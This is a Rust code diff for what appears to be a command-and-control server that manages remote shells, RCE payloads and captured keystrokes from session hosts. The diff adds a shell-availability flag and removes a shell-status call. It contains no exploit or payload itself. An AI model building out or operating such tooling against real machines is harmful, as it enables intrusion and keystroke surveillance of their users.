@@ -13,8 +13,7 @@ use crate::{
         remote_shell_server::{RemoteShell, RemoteShellServer},
         session_server::{Session, SessionServer},
         AvailableRceResponse, Empty, ListSessionsResponse, SessionRcePayload, SessionRequest,
-        SessionResponse, SetSessionLayoutRequest, SetSessionRceRequest, ShellStatusResponse,
-        ShellStd,
+        SessionResponse, SetSessionLayoutRequest, SetSessionRceRequest, ShellStd,
     },
     tcp_shell::TcpShell,
     SessionsStore, TargetArch,
@@ -60,8 +59,9 @@ impl Session for SessionsStore {
                 }),
                 _ => None,
             };
+            let session_ip = s.ip.to_string();
             sessions.push(SessionResponse {
-                ip: s.ip.to_string(),
+                ip: session_ip.clone(),
                 key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
                 rce_payload: rce_payload,
                 first_packet: s.first_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
@@ -69,6 +69,7 @@ impl Session for SessionsStore {
                 n_packets: s.n_packets as u32,
                 keyboard_layout: s.keyboard_layout as u32,
                 arch: s.arch.clone() as u32,
+                shell_availability: s.shell_availability,
             })
         }
 
@@ -92,9 +93,9 @@ impl Session for SessionsStore {
                     Some(payload) => Some(SessionRcePayload {name:payload.name,target_arch:payload.target_arch.to_string(),length:payload.length as u32,buffer_length:payload.buffer.len() as u32}),
                     _ => None,
                 };
-
+                let session_ip=session.ip.clone().to_string();
                 yield SessionResponse {
-                    ip: session.ip.to_string(),
+                    ip: session_ip,
                     key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
                     rce_payload: rce_payload,
                     first_packet:  session.first_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
@@ -102,6 +103,7 @@ impl Session for SessionsStore {
                     n_packets:session.n_packets as u32,
                     keyboard_layout: session.keyboard_layout as u32,
                     arch: session.arch.clone() as u32,
+                    shell_availability:session.shell_availability
                 };
 
 
@@ -153,6 +155,7 @@ fn extract_rce_metadata(path: String) -> Option<(String, TargetArch)> {
     }
     None
 }
+
 #[tonic::async_trait]
 impl Rce for SessionsStore {
     async fn delete_session_rce(
@@ -291,20 +294,7 @@ impl RemoteShell for TcpShell {
         })?;
         return Ok(Response::new(Empty {}));
     }
-    async fn shell_status(
-        &self,
-        request: Request<SessionRequest>,
-    ) -> Result<Response<ShellStatusResponse>, Status> {
-        debug!(
-            "<ShellStatus> Got a request from {:?}",
-            request.remote_addr()
-        );
-        let req = request.into_inner();
-        match self.get_rx_tx(req.ip.clone()) {
-            Err(_) => Ok(Response::new(ShellStatusResponse { status: 0 })),
-            _ => Ok(Response::new(ShellStatusResponse { status: 1 })),
-        }
-    }
+
     async fn shell_close(
         &self,
         request: Request<SessionRequest>,
@@ -317,6 +307,11 @@ impl RemoteShell for TcpShell {
         match self.get_rx_tx(req.ip.clone()) {
             Ok(_) => {
                 self.rx_tx_map.write().unwrap().remove(&req.ip.clone());
+                let mut current_sessions = self.session_store.sessions.lock().await;
+                let current_session = current_sessions
+                    .get_mut(&Ipv4Addr::from_str(&req.ip.clone()).unwrap())
+                    .unwrap();
+                current_session.set_shell_availibility(false);
             }
             _ => {}
         }
